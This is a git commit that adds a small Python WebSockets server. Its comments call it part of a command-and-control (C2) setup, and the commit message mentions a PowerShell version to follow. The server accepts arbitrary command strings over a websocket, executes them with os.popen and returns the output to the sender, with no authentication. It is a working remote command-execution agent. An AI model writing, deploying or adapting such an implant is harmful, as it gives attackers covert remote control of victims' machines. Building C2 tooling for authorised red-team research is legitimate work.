ac5e3187c63b73bc52645d32a3f2c4f05c0e8dbd
Andy Gill <ZephrFish@users.noreply.github.com>
2022-09-20 21:06:26 +0100

    Server and client written in python, PS to come

---
+++ WS-ServerCMD.py
@@ -0,0 +1,58 @@
+#!/usr/bin/env python
+# WebSockets Server 
+# ZephrFish
+
+import asyncio
+import websockets
+import os 
+import time
+
+# Reqs:
+#   Ability to receive commands and execute them
+
+# async def send_cmds(websocket):
+#     while cmd != 'exit':
+#         cmd = input("Enter Command To Run: ")
+#         await websocket.send(cmd)
+#         print(f"Sending {cmd}")
+#         cmd_output = await websocket.recv()
+#         print("Output from Command: ")
+#         print(f"Received: {cmd_output}")
+#     else:
+#         print("Exiting Gracefully")
+#         exit()
+
+# Colours
+def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
+def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
+def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
+def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
+
+
+
+async def hello(websocket, path):
+    cmd = await websocket.recv()
+    print(f"Command Received: {cmd}")
+    
+    
+    # Print back output from commands and send them to client
+    output = os.popen(cmd).read()
+
+    await websocket.send(output)
+    # Listen for exit command from C2
+    if cmd == "exit":
+        exit()
+    
+    prCyan("Output Received: ")
+    cmdrec = await websocket.recv()
+    print(cmdrec)
+
+    
+
+    prYellow("Waiting for input...")
+
+# Listen on host and port specified
+start_server = websockets.serve(hello, 'localhost', 8765)
+
+asyncio.get_event_loop().run_until_complete(start_server)
+asyncio.get_event_loop().run_forever()
